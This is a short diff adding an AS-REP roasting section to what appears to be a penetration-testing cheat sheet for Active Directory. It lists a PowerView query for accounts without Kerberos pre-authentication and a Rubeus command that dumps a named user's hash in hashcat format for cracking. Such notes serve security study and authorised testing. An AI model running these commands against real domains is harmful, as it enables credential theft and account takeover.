@@ -351,4 +351,10 @@ Restart-Service WinRM
 ```
   Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 ```
+**ASREPROasting**
+```
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+
 
